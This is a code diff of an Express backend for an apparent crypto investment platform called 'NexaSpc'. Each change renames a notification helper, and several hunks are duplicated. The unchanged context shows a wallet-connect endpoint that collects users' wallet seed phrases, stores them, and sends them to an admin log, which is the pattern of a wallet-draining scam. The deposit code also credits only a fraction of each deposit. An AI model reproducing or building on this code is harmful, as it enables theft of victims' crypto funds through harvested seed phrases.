@@ -120,7 +120,7 @@ async function sendSms(phone, message) {
 
 
 // ─── ADMIN / NOTIFICATION HELPERS ─────────────────────────────\
-function pushNotification(email, type, message, meta = {}) {
+function pushNotif(email, type, message, meta = {}) {
   if (!notifications[email]) notifications[email] = [];
   const notif = {
     id: Date.now() + Math.random(),
@@ -439,7 +439,7 @@ app.post('/api/login', async (req, res) => {
  
   user.lastLogin = new Date().toISOString();
  
-  pushNotification(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
+  pushNotif(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
   await sendEmail(email, '🔐 NexaSpc Login Alert', `
     <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px">
       <h2 style="color:#00d4ff">Login Detected</h2>
@@ -484,7 +484,7 @@ app.put('/api/settings/profile', authMiddleware, (req, res) => {
   if (username) user.username = username;
   if (phone !== undefined) user.phone = phone;
   if (country !== undefined) user.country = country;
-  pushNotification(req.user.email, 'settings', 'Profile information updated.');
+  pushNotif(req.user.email, 'settings', 'Profile information updated.');
   res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
 });
  
@@ -495,7 +495,7 @@ app.put('/api/settings/password', authMiddleware, async (req, res) => {
   if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
   if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
   user.password = await bcrypt.hash(newPassword, 10);
-  pushNotification(req.user.email, 'security', 'Password changed successfully.');
+  pushNotif(req.user.email, 'security', 'Password changed successfully.');
   await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
     <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
       <h2 style="color:#00d4ff">Password Changed</h2>
@@ -507,7 +507,7 @@ app.put('/api/settings/password', authMiddleware, async (req, res) => {
 app.put('/api/settings/2fa', authMiddleware, (req, res) => {
   const user = users[req.user.email];
   user.twoFAEnabled = !user.twoFAEnabled;
-  pushNotification(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
+  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
   res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
 });
  
@@ -615,7 +615,7 @@ app.post('/api/login', async (req, res) => {
  
   user.lastLogin = new Date().toISOString();
  
-  pushNotification(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
+  pushNotif(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
   await sendEmail(email, '🔐 NexaSpc Login Alert', `
     <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px">
       <h2 style="color:#00d4ff">Login Detected</h2>
@@ -661,7 +661,7 @@ app.put('/api/settings/profile', authMiddleware, (req, res) => {
   if (username) user.username = username;
   if (phone !== undefined) user.phone = phone;
   if (country !== undefined) user.country = country;
-  pushNotification(req.user.email, 'settings', 'Profile information updated.');
+  pushNotif(req.user.email, 'settings', 'Profile information updated.');
   res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
 });
  
@@ -672,7 +672,7 @@ app.put('/api/settings/password', authMiddleware, async (req, res) => {
   if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
   if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
   user.password = await bcrypt.hash(newPassword, 10);
-  pushNotification(req.user.email, 'security', 'Password changed successfully.');
+  pushNotif(req.user.email, 'security', 'Password changed successfully.');
   await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
     <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
       <h2 style="color:#00d4ff">Password Changed</h2>
@@ -684,7 +684,7 @@ app.put('/api/settings/password', authMiddleware, async (req, res) => {
 app.put('/api/settings/2fa', authMiddleware, (req, res) => {
   const user = users[req.user.email];
   user.twoFAEnabled = !user.twoFAEnabled;
-  pushNotification(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
+  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
   res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
 });
  
@@ -720,7 +720,7 @@ app.post('/api/wallet/connect', authMiddleware, (req, res) => {
   if (!connectedWallets[req.user.email]) connectedWallets[req.user.email] = [];
   const entry = { id: Date.now(), walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', connectedAt: new Date().toISOString() };
   connectedWallets[req.user.email].push(entry);
-  pushNotification(req.user.email, 'wallet', `${walletType} wallet connected.`);
+  pushNotif(req.user.email, 'wallet', `${walletType} wallet connected.`);
   logAdmin('wallet_connected', { userEmail: req.user.email, username: users[req.user.email]?.username, walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', message: `Wallet: ${walletType} by ${users[req.user.email]?.username}` });
   res.json({ success: true, wallet: { id: entry.id, walletType, walletAddress: entry.walletAddress, network: entry.network, connectedAt: entry.connectedAt } });
 });
@@ -745,7 +745,7 @@ app.post('/api/deposit', authMiddleware, (req, res) => {
   user.balance  += amt * 0.05;
   const tx = { id: Date.now(), type: 'deposit', coin, amount: amt, txHash: txHash || 'pending', status: 'completed', date: new Date().toISOString() };
   transactions[req.user.email].push(tx);
-  pushNotification(req.user.email, 'deposit', `Deposit of $${amt.toFixed(2)} (${coin}) confirmed.`);
+  pushNotif(req.user.email, 'deposit', `Deposit of $${amt.toFixed(2)} (${coin}) confirmed.`);
   sendEmail(req.user.email, '✅ Deposit Confirmed - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto"><h2 style="color:#10b981">Deposit Confirmed</h2><p>Amount: $${amt.toFixed(2)} (${coin})</p><p>New Balance: $${user.balance.toFixed(2)}</p></div>`);
   logAdmin('deposit', { userEmail: req.user.email, username: user.username, message: `Deposit $${amt} (${coin}) by ${user.username}` });
   res.json({ success: true, transaction: tx, balance: user.balance, deposits: user.deposits, profits: user.profits });
@@ -762,7 +762,7 @@ app.post('/api/withdraw', authMiddleware, (req, res) => {
   if (source === 'profits') user.profits -= amt; else user.balance -= amt;
   const tx = { id: Date.now(), type: 'withdrawal', coin, amount: amt, walletAddress, source, status: 'pending', date: new Date().toISOString() };
   transactions[req.user.email].push(tx);
-  pushNotification(req.user.email, 'withdrawal', `Withdrawal of $${amt.toFixed(2)} (${coin}) submitted.`);
+  pushNotif(req.user.email, 'withdrawal', `Withdrawal of $${amt.toFixed(2)} (${coin}) submitted.`);
   sendEmail(req.user.email, '⏳ Withdrawal Submitted - NexaSpc', `<div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto"><h2 style="color:#00d4ff">Withdrawal Submitted</h2><p>Amount: $${amt.toFixed(2)} (${coin})</p><p>To: ${walletAddress}</p></div>`);
   res.json({ success: true, transaction: tx, balance: user.balance, profits: user.profits });
 });
